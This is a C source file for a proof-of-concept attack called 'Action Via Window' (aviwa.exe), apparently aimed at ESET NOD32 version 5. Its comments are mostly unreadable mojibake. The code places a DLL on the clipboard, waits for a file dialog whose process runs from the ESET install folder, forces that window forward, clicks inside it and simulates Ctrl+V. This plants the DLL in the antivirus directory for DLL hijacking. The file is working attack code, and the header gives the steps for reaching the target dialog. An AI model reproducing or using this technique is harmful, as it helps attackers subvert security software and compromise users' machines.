/***************************************************************************************************************\
*																												*
*											aviwa.exe															*
*																												*
*									"Action Via Window" attack													*
*											   PoC																* 
*																												*
* aviwa.exe �������� � ���� � ppeset.dll (����� ���, ��� �� feclient.dll);										*
* ������, ������� ����� ������ ����� � ���� ��� � ���� �����. ����� ��������� ��� �����.						*
* ��� ������� ���������� C:\xlogs, ��������� "����" � ����� ������ (��) � ����� ������ ���� �� ������������	*
* �����. ���� ���� ����� �������, ����� ������ �������, ��������� ��� ���� � ��������� ��� ������� ����������.	*
* ���� ���������� �������� ��� ��� ����� (������� ����� ����� ����), �� ��� ��������, ������� �� ��� ���� ���	*
* � ���� �����. ���� ���, �� ���������� �����. ���� ��, �� �������.												* 
* �.�, ���� ������� ����� ��������� ����������, �� �� ����� ���������� ���� � ��������� ����� (dll hijacking)	* 
* � �.�. (� ����� ������ ������ ����: �����������, ��������, ����������� etc).									* 
*																												*
* ������ PoC ������� ��� ���������� � NOD32 (v5), �� ����� (� ��������) ���� ��������� ��� ������ ���� (����)	*
*																												*
* ������ ���������� ���� ����� ���� ������� � ���32, ��������, ���:												*
* ESS NOD32 ������ ����� �� ������ � ���� -> Open ESS5 -> Setup -> Import and export settings -> ... ->			*
* ���� "�������";																								* 
*																												* 
\***************************************************************************************************************/

																							//m1x
																							//pr0mix@mail.ru
																							//EOF



#include "clipboard.h"
#include "misc.h"
#include <stdio.h>


 
/***************************************************************************************************\
*	����� main; 
*	���� ������� �����, �����!
* 
\***************************************************************************************************/
int main()
{
	char szFileName[MAX_PATH];	//����� ����� ����� ��������� ������ ���� (������� ���) dll, ������ ����� �������� �; dll � ������ ����� ������ ������ � ����� �����!; 
	char szDirName[] = "C:\\xlogs";	//������ ���������� ��� dll (��� ��� ������� ���� � ����� � ���� �������� ������ ����);
	char szWndName[] = "�������";	//����� ������ ���� �� �����; 
	char *pszCurDir;	//��������� �� ������ - ������� ���������� ������� ��������; 
	char szDesiredDir[MAX_PATH] = "C:\\Program Files\\ESET\\ESET Smart Security\\";	//�������� ���������� ��� ������� �����; 
	char szDllName[] = "ppeset.dll"; //"AhResXUITA.dll"; //feclient.dll; 
	char *pszFullPath;	//������ ���� (������� ���) dll, ���� ����� ��������� �; 
	LPSTR *pPart; 
//	char *pszFrom;
//	char szTo[] = "C:\\Games\\123\\123\\feclient1.dll\0\0";
//	char **pszFilesName;
//	int i = 0;
//	int op_type = -1;
	int len = 0;
	RECT rect = {0, 0, 0, 0}; 
	HWND hFindWnd;
	DWORD pid = 0;

	GetModuleFileNameA(0, szFileName, MAX_PATH);	//�������� ������ ���� � ������ �����;
	GetFullPathNameA(szFileName, MAX_PATH, szFileName, &pPart);	//pPart - ��������� �� ��� �����; 
	pPart[0] = 0;	//�������� ��� - �������� ������ ������ ���� (��� ����� - ���); 
	CreateDirectoryA(szDirName, 0);	//������ ���������� ��� ����� ��� (��� ��� ������� ��� � ����� � ���� ������); 
	strcat(szFileName, szDllName);	//��������� ��� �����, ������� ����� ���������� � ����������� ���� �� ������� ������ Ctrl+V; 
	len = strlen(szFileName);
	szFileName[len] = 0;	//������ ������ ������������� 2-�� �������������� ������; 
	szFileName[len + 1] = 0;

	if(!CopyPasteFileToClipboard(0, szFileName, DROPEFFECT_MOVE))	//�������� ������ ������ � �� (������ ������ ���� ������ ��� �����); 
	{
		printf("main: error: CopyPasteFileToClipboard is FAULT!\n"); 
		return 0;
	}

/*
	pszFilesName = GetDataFromClipboard(0);	//�������� ������ ������ �� ��; 

	if(!pszFilesName)
	{
		printf("main: GetDataFromClipboard is FAULT!\n"); 
		return 0;
	}

	len = strlen(pszFilesName[i]);	//������, ��� ������ � ��� � �� ������ ���� ��� �����! �������� ��� �����; 
	pszFrom = (char*)malloc(sizeof(char) * len + 2);	//�������� ������ (+2 '\0');
	
	if(!pszFrom)
	{
		printf("main: pszFrom = 0!\n"); 
		return 0;
	}

	strcpy(pszFrom, pszFilesName[i]);	//�������� ��� ���; 
	pszFrom[len] = 0;
	pszFrom[len + 1] = 0;	//������ � ��� ������ � ����� �������������� ��������� '\0'; 

	printf("pszFrom = %s\n", pszFrom); 

	while(pszFilesName[i])
	{
		printf("pszFilesName[%d] = %s\n", i, pszFilesName[i]);
		free(pszFilesName[i]);
		i++;
	}

	free(pszFilesName);

	op_type = ClipboardOperationType(0);	//����� ��� �������� � ��; 

	printf("op_type = %d\n", op_type); 

//	CopyPasteFileToDisk(pszFrom, szTo, op_type);	//��������� ������ �������� � ��������� ������ (�����������/�����������); 
*/

	pszFullPath = (char*)malloc(sizeof(char) * (strlen(szDesiredDir) + strlen(szDllName)) + 1);	//�������� ������;

	if(!pszFullPath)
	{
		printf("main: error: pszFullPath = 0!\n"); 
		return 0;
	}

	strcpy(pszFullPath, szDesiredDir);	//��������� ������ ����, ���� ����� ���������� ���� (dll); 
	strcat(pszFullPath, szDllName); 

	while(1)
	{
		hFindWnd = GetPIDOnWindow(szWndName, &pid);	//���� ������ ��� ���� �� �����, � �������� ID ��������, ������� ������ ������ ����; 

		if(hFindWnd)	//�����?
		{
			pszCurDir = GetStringFromProcess(pid, STR_CURDIR);	//�������� ������� ���������� ��������, ������� ������ ������ ��� ����; 

			if(!pszCurDir)
			{
				printf("main: error: pszCurDir = 0!\n"); 
				free(pszFullPath);
				return 0;
			}

			if(stricmp(pszCurDir, szDesiredDir) == 0)	//���������, �������� �� ������� ���������� �������� ������ ����������� ��� ������� �����?
			{
				if(GetFileAttributesA(pszFullPath) == INVALID_FILE_ATTRIBUTES)	//������ ��������, ���� �� � ���� ���������� ������ ����? ���� ���, ������ ����� ��� ���������. ���� ����, ������ �� ��� ��� ��������, �������; 
				{
					ShowWindow(hFindWnd, SW_SHOWNORMAL);	//���������� ���� � ���������� ������, 
					SetForegroundWindow(hFindWnd);	//� ����� ������������ ��� (���� � ����� ����������� �� ������ ������); 

					if(IsWindowSuitable(hFindWnd))	//���� ���� ��������� (�� ����), �� 
					{
						GetWindowRect(hFindWnd, &rect);	//�������� ���������� ��������� ����
						ClickLBM(hFindWnd, (rect.left + 400), (rect.top + 200));	//������� �� �������� ���������� ���� (���� ��� ���� ������ ������, �� ������ ���������� �� SHELLDLL_DefView->SysListView32, �.�. ������ �� ������ ���� ���������� Ctrl + V); 

						keybd_event(VK_CONTROL, 0, 0, 0);	//���������� ��������� ���� Ctrl + V (������� �����); 
						keybd_event('V', 0, 0, 0);
						keybd_event('V', 0, KEYEVENTF_KEYUP, 0); 
						keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0); 
					}
				}
				else
				{
					free(pszCurDir);
					free(pszFullPath);
					break;	//��������� ���� � �������; 
				}
			}

			free(pszCurDir);
		}

		printf("."); 
		Sleep(1000); 
	}
	
	printf("\nmain: success: the job is done!\n");	//�������! 

	return 0;
}
/***************************************************************************************************\
*	����� ����� main; 
\***************************************************************************************************/
 